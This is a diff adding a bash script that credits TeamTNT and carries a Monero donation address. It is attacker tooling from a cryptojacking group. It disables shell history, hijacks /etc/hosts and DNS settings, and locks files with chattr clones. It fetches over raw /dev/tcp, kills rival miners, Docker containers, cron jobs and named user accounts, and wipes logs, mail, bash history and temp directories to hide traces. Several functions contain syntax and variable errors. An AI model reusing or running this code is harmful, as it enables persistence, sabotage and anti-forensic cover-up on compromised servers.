@@ -1,0 +1,387 @@
+#!/bin/bash
+#
+#	TITLE:		Old_File_Disposal 
+#	AUTOR:		hilde@teamtnt.red
+#	VERSION:	1.00.0
+#	DATE:		17.11.2021
+#
+#	SRC:		https://teamtnt.red/scripte/Old_File_Disposal.sh.txt
+#
+#	DONATE_XMR:     46W59PibkXQckX7LtXT8p4ircXZgDLVR8fZtpS9ZLBbz9hjFhQwijwdi5chKAco59VVUQHSqjpkUuZMYa2J66AKUDUHiRrU
+#
+########################################################################
+
+if [ "$(hostname)" = "HaXXoRsMoPPeD" ]; then exit ; fi
+
+ulimit -n 65535
+export LC_ALL=C.UTF-8 2>/dev/null 1>/dev/null
+export LANG=C.UTF-8 2>/dev/null 1>/dev/null
+HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null 1>/dev/null
+export HISTFILE=/dev/null 2>/dev/null 1>/dev/null
+HISTSIZE=0 2>/dev/null 1>/dev/null
+unset HISTFILE 2>/dev/null 1>/dev/null
+
+export PATH=$PATH:/var/bin:/bin:/sbin:/usr/sbin:/usr/bin
+
+
+########################################################################
+
+SERV_ARRAY=("c3pool_miner" "apache4" "ext4" "pnsd" "na")
+
+FILE_ARRAY=("./cpeeu" "xmrig" "~/python3" "/usr/bin/dbused" "/etc/fonts/conf.d/6qmecb/kthreaddk" "/etc/dpkg/origins/6qmecb/kthreaddk"\
+			"/usr/local/bin/kswap_svc" "/var/tmp/kworkers/systemd-host" "/usr/sbin/.configure/xmrigMiner" "/usr/sbin/.configure/xmrigDaemon"\
+			"/var/tmp/c3pool/xmrig" "/root/c3pool/xmrig" "/tmp/.firstrun-update.pid"\
+			"/var/tmp/bbb/bbb" "/tmp/bbb/bbb" "/opt/bbb/bbb")
+
+DIRS_ARRAY=("/etc/fonts/conf.d/6qmecb/" "/etc/dpkg/origins/6qmecb/" "$HOME/c3pool/" "/var/tmp/kworkers/" "/usr/sbin/.configure/" "/root/.x/"\
+			"/root/.sh/" "/var/tmp/c3pool/" "/var/tmp/bbb/" "/tmp/bbb/" "/opt/bbb/")
+
+JSON_ARRAY=("/usr/sbin/.configure/config.json" "/root/.configures/config.json" "/usr/bin/c3pool/config.json" "/root/.x/config.json" "/config.json"\
+			"/var/tmp/c3pool/config.json" "/var/tmp/c3pool/config_background.json" "/root/c3pool/config.json" "/root/c3pool/config_background.json"\
+			"/usr/bin/config.json" "/var/tmp/bbb/config.json")
+
+PROC_ARRAY=("cpeeu" "xmrig" "python3" "dbused" "kthreaddk" "kswap_svc" "systemd-host" "xmrigMiner" "xmrigDaemon" "\[ext4\]" "bbb")
+
+DOCKER_ARRAY=("xmrig" "xmr" "chroot" "apt-get update" "dockgeddon" "wscopescan"\
+			  "fuhou" "mangletmpuser" "sandeep078" "alpineos")
+
+SSHAXX_ARRAY=("darmok" "cokkokotre1" "akay" "system" "sysall" "logger" "autoupdater" "o" "phishl00t" "opsecx12")
+
+########################################################################
+
+function INT_MAIN(){
+TNT_DNS_MOD
+TNT_CURL_WGET_FIX
+TNT_SETUP_SOME_PACKS
+INIT_MAIN_CLEANUP
+TNT_CLEAN_TRACES
+}
+
+function TNT_DLBYPASS() {
+  read proto server path <<< "${1//"/"/ }"
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
+  exec 3<>/dev/tcp/${HOST}/$PORT
+  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  while IFS= read -r line ; do 
+      [[ "$line" == $'\r' ]] && break
+  done <&3
+  nul='\0'
+  while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do 
+      printf "%s$nul" "$x"
+  done <&3
+  exec 3>&-
+}
+
+function TNT_PACKMAN_CLEANER(){
+if type apk 2>/dev/null 1>/dev/null; then 
+apk update 2>/dev/null 1>/dev/null
+fi
+if type apt-get 2>/dev/null 1>/dev/null; then 
+apt-get clean 2>/dev/null 1>/dev/null
+apt-get autoclean 2>/dev/null 1>/dev/null
+apt-get autoremove -y 2>/dev/null 1>/dev/null
+apt-get update --fix-missing 2>/dev/null 1>/dev/null
+fi
+if type yum 2>/dev/null 1>/dev/null; then
+yum clean all 2>/dev/null 1>/dev/null
+rm -rf /var/cache/yum 2>/dev/null 1>/dev/null
+fi
+export TTPMC="done"
+}
+
+function TNT_PACKMAN(){
+BINARY=$1
+if [ "$(id -u)" == "0" ]; then
+	if ! type $BINARY 2>/dev/null 1>/dev/null; then 
+		if [[ -z "$TTPMC" ]]; then
+			TNT_PACKMAN_CLEANER
+		fi
+		if type apk 2>/dev/null 1>/dev/null; then 
+			APKPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'apk' | head -n 1 | sed 's#<code>apk add ##g' | sed 's#</code>##g')
+			apk add $APKPACK 2>/dev/null 1>/dev/null
+		fi
+		if type apt-get 2>/dev/null 1>/dev/null; then 
+			APTPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'apt-get' | head -n 1 | sed 's#<code>apt-get install ##g' | sed 's#</code>##g')
+			apt-get install -y $APTPACK 2>/dev/null 1>/dev/null
+			apt-get install -y $APTPACK --reinstall 2>/dev/null 1>/dev/null
+		fi
+		if type yum 2>/dev/null 1>/dev/null; then
+			YUMPACK=$(wget -q -O- http://command-not-found.com/$BINARY | grep 'yum' | head -n 1 | sed 's#<code>yum install ##g' | sed 's#</code>##g')
+			yum install -y $YUMPACK 2>/dev/null 1>/dev/null
+			yum reinstall -y $YUMPACK 2>/dev/null 1>/dev/null
+		fi
+	fi
+fi
+}
+
+function TNT_UNLOCK(){
+TNT_TO_UNLOCK=$1
+TNT_LOCKTYP=$2
+if [[ ! -z "$1" ]]; then
+if [[ "$TNT_LOCKTYP" = "dir" ]]; then
+if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+else 
+if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -ia $TNT_TO_UNLOCK 2>/dev/null 1>/dev/null; fi
+fi
+fi
+}
+
+function TNT_LOCK(){
+TNT_TO_LOCK=$1
+TNT_LOCKTYP=$2
+if [[ ! -z "$1" ]]; then
+if [[ "$TNT_LOCKTYP" = "dir" ]]; then
+if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr -R +i $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+else
+if [[ "$(which chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+if [[ "$(which C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v tntrecht 2>/dev/null 1>/dev/null)" = "0" ]]; then tntrecht +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v ichdarf 2>/dev/null 1>/dev/null)" = "0" ]]; then ichdarf +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+	if [[ "$(command -v C_hg_chattr 2>/dev/null 1>/dev/null)" = "0" ]]; then C_hg_chattr +a $TNT_TO_LOCK 2>/dev/null 1>/dev/null; fi
+fi
+fi
+}
+
+function TNT_REMOVE(){
+TNT_TO_RM=$1
+TNT_RMTYP=$2
+if [[ ! -z "$1" ]]; then
+if [[ "$TNT_RMTYP" = "dir" ]]; then
+TNT_UNLOCK $TNT_RMTYP dir
+chmod 1777 $TNT_RMTYP -r 2>/dev/null 1>/dev/null 
+rm -fr $TNT_RMTYP 2>/dev/null 1>/dev/null 
+else
+TNT_UNLOCK $TNT_RMTYP
+chmod 1777 $TNT_RMTYP 2>/dev/null 1>/dev/null 
+rm -f $TNT_RMTYP 2>/dev/null 1>/dev/null 
+fi
+fi
+}
+
+function TNT_CURL_WGET_FIX(){
+cp /bin/cd1 /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cd1 /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cd1 /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cd1 /usr/curl 2>/dev/null 1>/dev/null
+cp /bin/cur /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cur /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cur /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cur /usr/curl 2>/dev/null 1>/dev/null
+cp /bin/cdl /usr/bin/curl 2>/dev/null 1>/dev/null;cp /bin/cdl /usr/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cdl /usr/bin/curl 2>/dev/null 1>/dev/null;cp /usr/bin/cdl /usr/curl 2>/dev/null 1>/dev/null
+
+cp /bin/wd1 /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wd1 /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wd1 /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wd1 /usr/wget 2>/dev/null 1>/dev/null
+cp /bin/wge /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wge /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wge /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wge /usr/wget 2>/dev/null 1>/dev/null
+cp /bin/wdl /usr/bin/wget 2>/dev/null 1>/dev/null;cp /bin/wdl /usr/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wdl /usr/bin/wget 2>/dev/null 1>/dev/null;cp /usr/bin/wdl /usr/wget 2>/dev/null 1>/dev/null
+}
+
+function TNT_IER(){
+# IF_EXIST_REMOVE
+TNT_TEXT=$1
+TNT_FILE=$2
+if [[ "$(grep $TNT_TEXT $TNT_FILE)" ]]; then
+TNT_UNLOCK $TNT_FILE
+sed -i '/'$TNT_TEXT'/d' $TNT_FILE 2>/dev/null
+TNT_LOCK $TNT_FILE
+fi
+}
+
+function TNT_DNS_MOD(){
+
+if [[ ! "$(grep '2606:4700:3030::ac43:bc98 command-not-found.com' /etc/hosts)" ]]; then TNT_UNLOCK / ; TNT_UNLOCK /etc/ ; TNT_UNLOCK /etc/hosts
+echo '2606:4700:3030::ac43:bc98 command-not-found.com' >> /etc/hosts 2>/dev/null ; TNT_LOCK /etc/hosts ; fi
+
+if [[ ! "$(grep '140.82.121.4 github.com' /etc/hosts)" ]]; then TNT_UNLOCK / ; TNT_UNLOCK /etc/ ; TNT_UNLOCK /etc/hosts
+echo '140.82.121.4 github.com' >> /etc/hosts 2>/dev/null ; TNT_LOCK /etc/hosts ; fi
+
+if [[ ! "$(grep '54.81.89.50 docker.io' /etc/hosts)" ]]; then TNT_UNLOCK / ; TNT_UNLOCK /etc/ ; TNT_UNLOCK /etc/hosts
+echo '54.81.89.50 docker.io' >> /etc/hosts 2>/dev/null ; TNT_LOCK /etc/hosts ; fi
+
+if [[ ! "$(grep '52.55.43.248 index.docker.io' /etc/hosts)" ]]; then TNT_UNLOCK / ; TNT_UNLOCK /etc/ ; TNT_UNLOCK /etc/hosts
+echo '52.55.43.248 index.docker.io' >> /etc/hosts 2>/dev/null ; TNT_LOCK /etc/hosts ; fi
+
+if [[ ! "$(grep '45.9.148.108 teamtnt.red' /etc/hosts)" ]];then TNT_IER teamtnt /etc/hosts;TNT_UNLOCK /etc/hosts
+echo "45.9.148.108 teamtnt.red" >> /etc/hosts 2>/dev/null;TNT_LOCK /etc/hosts;fi
+
+if [[ ! "$(grep 'nameserver 8.8.8.8\|nameserver 8.8.4.4' /etc/resolv.conf)" ]];then TNT_IER nameserver /etc/resolv.conf;fi
+if [[ ! "$(grep 'nameserver 8.8.8.8' /etc/resolv.conf)" ]];then TNT_UNLOCK /etc/resolv.conf;echo "nameserver 8.8.8.8" >> /etc/resolv.conf 2>/dev/null;TNT_LOCK /etc/resolv.conf;fi
+if [[ ! "$(grep 'nameserver 8.8.4.4' /etc/resolv.conf)" ]];then TNT_UNLOCK /etc/resolv.conf;echo "nameserver 8.8.4.4" >> /etc/resolv.conf 2>/dev/null;TNT_LOCK /etc/resolv.conf;fi
+}
+
+function TNT_CLEAN_TRACES(){
+TNT_UNLOCK /tmp/ dir
+TNT_REMOVE /tmp/*
+TNT_REMOVE /tmp/.*
+	TNT_UNLOCK /var/tmp/ dir
+	TNT_REMOVE /var/tmp/*
+	TNT_REMOVE /var/tmp/.*
+TNT_UNLOCK /var/log/secure
+TNT_REMOVE /var/log/secure
+touch /var/log/secure
+	TNT_UNLOCK /var/log/wtmp
+	TNT_REMOVE /var/log/wtmp
+	touch /var/log/wtmp
+TNT_UNLOCK /var/spool/mail/root
+TNT_REMOVE /var/spool/mail/root
+touch /var/spool/mail/root
+if [[ ! -z "$MAIL" ]]; then
+TNT_UNLOCK $MAIL
+TNT_REMOVE $MAIL
+touch $MAIL ; fi
+	TNT_UNLOCK ~/
+	TNT_UNLOCK ~/.bash_history
+	TNT_REMOVE ~/.bash_history
+	touch ~/.bash_history
+	TNT_LOCK ~/.bash_history
+history -c
+clear
+}
+
+function TNT_SETUP_SOME_PACKS(){
+TNT_PACKMAN bash
+TNT_PACKMAN curl
+TNT_PACKMAN lspci
+TNT_PACKMAN ps
+TNT_PACKMAN chmod
+TNT_PACKMAN chattr
+TNT_PACKMAN ssh
+TNT_PACKMAN crontab
+TNT_PACKMAN rm
+TNT_PACKMAN strings
+}
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
+
+function INIT_MAIN_CLEANUP(){
+KILL_BAD_SERVICE
+KILL_BAD_FILES
+KILL_BAD_DIRS
+KILL_JSON_FILES
+KILL_BAD_PROCS
+KILL_BAD_DOCKER
+KILL_TMP_FILES
+KILL_CRONJOBS
+KILL_SSH_USER
+}
+
+function KILL_BAD_SERVICE(){
+if type systemctl 2>/dev/null 1>/dev/null; then
+	for BAD_SERVICE in ${SERV_ARRAY[@]}; do
+	systemctl daemon-reload
+	systemctl stop $BAD_SERVICE
+	systemctl disable $BAD_SERVICE
+	done
+fi
+}
+
+function KILL_BAD_FILES(){
+for BAD_FILE in ${FILE_ARRAY[@]}; do
+	if [[ -f "$BAD_FILE" ]]; then
+	TNT_UNLOCK $BAD_FILE
+	chmod 1777 $BAD_FILE 2>/dev/null 1>/dev/null;tntchmod 1777 $BAD_FILE 2>/dev/null 1>/dev/null
+	TNT_REMOVE $BAD_FILE
+	fi
+done
+}
+
+function KILL_BAD_DIRS(){
+for BAD_DIR in ${DIRS_ARRAY[@]}; do
+	if [[ -d "$BAD_DIR" ]]; then
+	TNT_UNLOCK $BAD_DIR dir
+	chmod 1777 $BAD_DIR -R 2>/dev/null 1>/dev/null;tntchmod 1777 $BAD_DIR -R 2>/dev/null 1>/dev/null
+	TNT_REMOVE $BAD_DIR dir
+	fi
+done
+}
+
+function KILL_JSON_FILES(){
+for JSON_FILE in ${JSON_ARRAY[@]}; do
+	if [[ -f "$JSON_FILE" ]]; then
+	TNT_UNLOCK $JSON_FILE
+	chmod 1777 $JSON_FILE 2>/dev/null 1>/dev/null;tntchmod 1777 $JSON_FILE 2>/dev/null 1>/dev/null
+	TNT_REMOVE $JSON_FILE
+	fi
+done
+}
+
+function KILL_BAD_PROCS(){
+for BAD_PROC in ${PROC_ARRAY[@]}; do
+	BAD_PIDS=$(ps ax | grep -v grep | grep $BAD_PROC | awk '{print $1}')
+	if [[ ! -z "$BAD_PIDS" ]];then 
+		for BADPID in ${BAD_PIDS[@]}; do 
+		kill $BADPID 2>/dev/null 1>/dev/null
+		done
+	fi
+		pkill $BAD_PROC 2>/dev/null 1>/dev/null
+		killall $BAD_PROC 2>/dev/null 1>/dev/null
+done
+fi
+
+function KILL_BAD_DOCKER(){
+if type docker 2>/dev/null 1>/dev/null
+	for BAD_DOCKER in ${DOCKER_ARRAY[@]}; do
+			BAD_CONTAINER=$(docker ps | grep -v 'CONTAINER\|CPND' | grep "$BAD_DOCKER" | awk '{print $1}')
+		if [[ ! -z "$BAD_CONTAINER" ]];then
+			docker stop $BAD_CONTAINER 2>/dev/null 1>/dev/null
+			docker rm $BAD_CONTAINER -f 2>/dev/null 1>/dev/null
+		fi
+	done
+fi
+}
+
+function KILL_TMP_FILES(){
+TNT_UNLOCK /tmp/ dir
+TNT_UNLOCK /var/tmp/ dir
+TNT_REMOVE /tmp/ dir
+TNT_REMOVE /var/tmp/ dir
+mkdir -p /var/tmp/ 2>/dev/null 1>/dev/null
+mkdir -p /tmp/ 2>/dev/null 1>/dev/null
+}
+
+function KILL_CRONJOBS(){
+TNT_UNLOCK /var/spool/cron/ dir
+crontab -r 2>/dev/null 1>/dev/null
+TNT_REMOVE /var/spool/cron/ dir
+crontab -l 2>/dev/null 1>/dev/null
+mkdir -p /var/spool/cron/crontabs/ 2>/dev/null 1>/dev/null
+}
+
+function KILL_SSH_USER(){
+TNT_UNLOCK /etc/passwd
+TNT_UNLOCK /etc/shadow
+TNT_UNLOCK /etc/sudoers
+	for BAD_SSH_AXX in ${KILL_SSH_USER[@]}; do
+		find /var/spool/at/ -name "[^.]*" -type f -user $BAD_SSH_AXX -delete 2>/dev/null 1>/dev/null
+		crontab -r -u $BAD_SSH_AXX 2>/dev/null 1>/dev/null
+		lprm $BAD_SSH_AXX 2>/dev/null 1>/dev/null	
+		userdel -rf $BAD_SSH_AXX 2>/dev/null 1>/dev/null
+		userdel -rZf $BAD_SSH_AXX 2>/dev/null 1>/dev/null
+		deluser --remove-all-files $BAD_SSH_AXX 2>/dev/null 1>/dev/null 
+	done
+TNT_LOCK /etc/passwd
+TNT_LOCK /etc/shadow
+TNT_LOCK /etc/sudoers
+}
+
+
+INT_MAIN
